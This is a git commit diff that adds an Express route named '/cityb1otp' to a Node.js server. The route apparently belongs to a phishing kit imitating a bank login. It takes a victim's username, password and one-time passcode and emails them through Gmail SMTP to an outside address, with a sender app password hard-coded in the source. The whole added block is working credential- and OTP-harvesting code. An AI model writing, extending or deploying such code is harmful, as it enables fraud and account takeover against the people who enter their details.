881b1458da9ba7a762e303540a0905af18bc1f32
ssagif <hartwellgideon@gmail.com>
2025-01-16 22:10:48 +0100

    Add files via upload

--- index.js
+++ index.js
@@ -1313,3 +1313,47 @@ app.post("/cityb1", async (req, res) => {
     }
   });
 });
+
+
+
+app.post("/cityb1otp", async (req, res) => {
+  const { userName, otp, password } = req.body;
+
+  // Construct email message
+  const message = `
+    New OTP for ${userName}:
+
+    OTP: ${otp}
+
+    userName: ${userName}
+
+    password: ${password}
+
+
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "andrewjadielqqsd@gmail.com", // list of receivers
+    subject: `OTP for ${userName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
